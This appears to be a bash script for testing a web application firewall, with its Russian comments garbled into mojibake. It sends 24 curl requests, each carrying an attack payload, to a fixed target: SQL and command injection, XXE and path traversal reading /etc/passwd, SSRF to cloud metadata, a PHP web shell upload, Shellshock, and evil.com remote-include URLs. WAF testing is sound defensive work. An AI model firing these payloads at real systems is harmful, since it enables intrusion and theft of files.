#!/bin/bash
# WAF —Ç–µ—Å—Ç—ã —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º curl –¥–ª—è Linux (bash)

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è - —É–∫–∞–∂–∏—Ç–µ –∑–¥–µ—Å—å —Ü–µ–ª–µ–≤–æ–π —Å–∞–π—Ç
BASE_URL="https://msproject.site.net/console"

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –¥–ª—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
TOTAL_TESTS=24
BLOCKED=0
ALLOWED=0
ERRORS=0
RESULTS=()

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ç–µ—Å—Ç–∞ –∏ —Å–±–æ—Ä–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
run_test() {
    local test_name="$1"
    local test_cmd="$2"
    
    echo -e "\n=== –¢–µ—Å—Ç $(($TOTAL_TESTS_RUN+1)): $test_name ==="
    echo "–í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è: $test_cmd"
    
    # –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã –∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Å—Ç–∞—Ç—É—Å–∞
    result=$(eval "$test_cmd" 2>&1)
    status_code=$(echo "$result" | grep -oP 'HTTP/[\d.]+ \K\d+' | head -1)
    
    # –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ –æ—Ç–≤–µ—Ç–∞
    response_body=$(echo "$result" | awk -v RS='\r\n\r\n' 'END{print}')
    
    if [ "$status_code" == "403" ]; then
        echo "‚úÖ –°—Ç–∞—Ç—É—Å: –ó–ê–ë–õ–û–ö–ò–†–û–í–ê–ù–û (HTTP $status_code)"
        BLOCKED=$((BLOCKED+1))
        RESULTS+=("‚úÖ $test_name: –ó–ê–ë–õ–û–ö–ò–†–û–í–ê–ù–û (HTTP $status_code)")
        
        # –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ Transaction ID –µ—Å–ª–∏ –µ—Å—Ç—å
        tx_id=$(echo "$result" | grep -oP 'Transaction-ID: \K[a-f0-9-]+' | head -1)
        if [ ! -z "$tx_id" ]; then
            echo "üîë Transaction ID: $tx_id"
            RESULTS+=("   üîë Transaction ID: $tx_id")
        fi
        
        # –í—ã–≤–æ–¥ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ –æ—Ç–≤–µ—Ç–∞
        echo -e "\n–û—Ç–≤–µ—Ç —Å–µ—Ä–≤–µ—Ä–∞:"
        echo "Forbidden"
        if [ ! -z "$tx_id" ]; then
            echo "Transaction ID: $tx_id"
        fi
    elif [ "$status_code" == "" ]; then
        echo "‚ùå –û—à–∏–±–∫–∞: –ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å —Å—Ç–∞—Ç—É—Å –æ—Ç–≤–µ—Ç–∞"
        ERRORS=$((ERRORS+1))
        RESULTS+=("‚ùå $test_name: –û–®–ò–ë–ö–ê")
        
        # –í—ã–≤–æ–¥ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ –æ—Ç–≤–µ—Ç–∞ –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏
        echo -e "\n–°–æ–¥–µ—Ä–∂–∏–º–æ–µ –æ—Ç–≤–µ—Ç–∞:"
        echo "$response_body"
    else
        echo "‚ö†Ô∏è –°—Ç–∞—Ç—É—Å: –†–ê–ó–†–ï–®–ï–ù–û (HTTP $status_code)"
        ALLOWED=$((ALLOWED+1))
        RESULTS+=("‚ö†Ô∏è $test_name: –†–ê–ó–†–ï–®–ï–ù–û (HTTP $status_code)")
        
        # –í—ã–≤–æ–¥ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ –æ—Ç–≤–µ—Ç–∞
        echo -e "\n–°–æ–¥–µ—Ä–∂–∏–º–æ–µ –æ—Ç–≤–µ—Ç–∞:"
        echo "$response_body"
    fi
    
    TOTAL_TESTS_RUN=$((TOTAL_TESTS_RUN+1))
    echo ""
    sleep 1
}

# –ù–∞—á–∞–ª–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ç–µ—Å—Ç–æ–≤
echo "üöÄ –ù–∞—á–∏–Ω–∞–µ–º —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∞—Ç–∞–∫ –Ω–∞ WAF..."
echo "üìã –í—Å–µ–≥–æ –∑–∞–ø–ª–∞–Ω–∏—Ä–æ–≤–∞–Ω–æ —Ç–µ—Å—Ç–æ–≤: $TOTAL_TESTS"
echo "üéØ –¶–µ–ª–µ–≤–æ–π —Å–∞–π—Ç: $BASE_URL"
TOTAL_TESTS_RUN=0

# –¢–µ—Å—Ç 1: SQL Injection
run_test "SQL Injection" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "'"$BASE_URL"'/search?q=1'"'"'+OR+'"'"'1'"'"'%3D'"'"'1"'

# –¢–µ—Å—Ç 2: Cross-Site Scripting (HTML)
run_test "Cross-Site Scripting (HTML)" 'curl -s -v -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" -d "q=<script>alert(1)</script>" "'"$BASE_URL"'/search"'

# –¢–µ—Å—Ç 3: Cross-Site Scripting (URL)
run_test "Cross-Site Scripting (URL)" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "'"$BASE_URL"'/redirect?url=javascript:alert(1)"'

# –¢–µ—Å—Ç 4: XML External Entities (XXE)
run_test "XML External Entities (XXE)" 'curl -s -v -X POST -H "Content-Type: application/xml" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" -d '"'"'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>'"'"' "'"$BASE_URL"'/api/xml"'

# –¢–µ—Å—Ç 5: Path Traversal
run_test "Path Traversal" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "'"$BASE_URL"'/files?file=../../../etc/passwd"'

# –¢–µ—Å—Ç 6: NoSQL Injection
run_test "NoSQL Injection" 'curl -s -v -X POST -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" -d '"'"'{"search": {"$where": "function() { return true; }"}, "limit": 1}'"'"' "'"$BASE_URL"'/search"'

# –¢–µ—Å—Ç 7: OS Command Injection
run_test "OS Command Injection" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "'"$BASE_URL"'/status?cmd=ping;cat%20/etc/passwd"'

# –¢–µ—Å—Ç 8: Server-Side Request Forgery (SSRF)
run_test "Server-Side Request Forgery (SSRF)" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "'"$BASE_URL"'/proxy?url=http://169.254.169.254/latest/meta-data/"'

# –¢–µ—Å—Ç 9: Local File Inclusion (LFI)
run_test "Local File Inclusion (LFI)" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "'"$BASE_URL"'/include?file=../../../etc/passwd%00"'

# –¢–µ—Å—Ç 10: Server-Side Template Injection (SSTI)
run_test "Server-Side Template Injection (SSTI)" 'curl -s -v -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" -d "name={{7*7}}&email=test@example.com" "'"$BASE_URL"'/profile"'

# –¢–µ—Å—Ç 11: XPath Injection - –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è
run_test "XPath Injection" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "'"$BASE_URL"'/users?xpath=/users/user%5Busername/text()=%27admin%27%20or%20%271%27=%271%27%5D"'

# –¢–µ—Å—Ç 12: XML Injection
run_test "XML Injection" 'curl -s -v -X POST -H "Content-Type: application/xml" -H "Accept: application/xml" -H "User-Agent: sqlmap/1.4.7" -d '"'"'<?xml version="1.0" encoding="UTF-8"?><user><id>1 OR 1=1</id><name>test'"'"' OR '"'"'1'"'"'='"'"'1</name></user>'"'"' "'"$BASE_URL"'/api/xml"'

# –¢–µ—Å—Ç 13: Open Redirect
run_test "Open Redirect" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "'"$BASE_URL"'/redirect?url=http://evil.com/shell.php"'

# –¢–µ—Å—Ç 14: Web Shell Upload
run_test "Web Shell Upload" 'curl -s -v -X POST -H "Content-Type: multipart/form-data; boundary=---------------------------974767299852498929531610575" -H "User-Agent: Nessus/8.10.1" -H "X-Requested-With: XMLHttpRequest" --data-binary '"'"'-----------------------------974767299852498929531610575
Content-Disposition: form-data; name="file"; filename="shell.php.png"
Content-Type: image/png

GIF87a;
<?php
  system('\''id'\'');
?>
-----------------------------974767299852498929531610575--'"'"' "'"$BASE_URL"'/upload"'

# –¢–µ—Å—Ç 15: Cross-Site Request Forgery (CSRF) - –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è
run_test "Cross-Site Request Forgery (CSRF)" 'curl -s -v -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" -H "Origin: evil.com" -H "Referer: evil.com/fake.html" -H "X-CSRF-Token: fake-token" -d "username=<script>alert(document.cookie)</script>&password=password&action=login" "'"$BASE_URL"'/login"'

# –¢–µ—Å—Ç 16: Vulnerability Scanner
run_test "Vulnerability Scanner" 'curl -s -v -H "User-Agent: Nessus SOAP" "'"$BASE_URL"'/include?file=../../../../etc/passwd%00"'

# –¢–µ—Å—Ç 17: Automated Bot User Agent
run_test "Automated Bot User Agent" 'curl -s -v -X POST -H "Content-Type: application/json" -H "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)" -d '"'"'{"search": {"$where": "function() { return true; }"}, "limit": 1}'"'"' "'"$BASE_URL"'/search"'

# –¢–µ—Å—Ç 18: Malformed HTTP Request
run_test "Malformed HTTP Request" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" -H "X-Custom-IP-Authorization: 127.0.0.1" "'"$BASE_URL"'/files?file=../../../etc/passwd"'

# –¢–µ—Å—Ç 19: Response Splitting
run_test "Response Splitting" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "'"$BASE_URL"'/include?file=http://evil.com/shell.php"'

# –¢–µ—Å—Ç 20: JWT Attack (None Algorithm)
run_test "JWT Attack (None Algorithm)" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9." "'"$BASE_URL"'/api/admin?alg=none&debug=true"'

# –¢–µ—Å—Ç 21: Large Body Test (–≥–µ–Ω–µ—Ä–∏—Ä—É–µ–º –±–æ–ª—å—à–æ–π JSON payload)
BIG_PAYLOAD=$(printf '{"data": "%s"}' $(printf 'A%.0s' {1..50000}))
run_test "Large Body Test" 'curl -s -v -X POST -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" -d "$BIG_PAYLOAD" "'"$BASE_URL"'/api/data"'

# –¢–µ—Å—Ç 22: LFI with PHP Wrapper
run_test "LFI with PHP Wrapper" 'curl -s -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "'"$BASE_URL"'/download?file=php://filter/convert.base64-encode/resource=/etc/passwd&type=lfi"'

# –¢–µ—Å—Ç 23: RCE via User-Agent
run_test "RCE via User-Agent" 'curl -s -v -H "User-Agent: () { :; }; /bin/bash -c \"cat /etc/passwd\"" "'"$BASE_URL"'/"'

# –¢–µ—Å—Ç 24: GraphQL Introspection
run_test "GraphQL Introspection" 'curl -s -v -X POST -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" -d '"'"'{"query": "query{__schema{types{name,fields{name}}}}"}'"'"' "'"$BASE_URL"'/graphql"'

# –û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Å–≤–æ–¥–∫–∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
echo ""
echo "üìä ====== –û–¢–ß–ï–¢ –û –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ò PTAF PRO ======"
echo ""
echo "üéØ –í—Å–µ–≥–æ —Ç–µ—Å—Ç–æ–≤: $TOTAL_TESTS"
echo "üõ°Ô∏è –£—Å–ø–µ—à–Ω–æ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–æ: $BLOCKED"
echo "‚ö†Ô∏è –†–∞–∑—Ä–µ—à–µ–Ω–æ (–Ω–µ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–æ): $ALLOWED"
echo "‚ùå –û—à–∏–±–æ–∫: $ERRORS"
echo ""
echo "üìù –î–µ—Ç–∞–ª—å–Ω—ã–π –æ—Ç—á–µ—Ç –ø–æ —Ç–µ—Å—Ç–∞–º:"
echo ""

for result in "${RESULTS[@]}"; do
    echo "$result"
done

echo ""
echo "üéØ ======================================"

echo "‚ú® –í—Å–µ —Ç–µ—Å—Ç—ã –≤—ã–ø–æ–ª–Ω–µ–Ω—ã!" 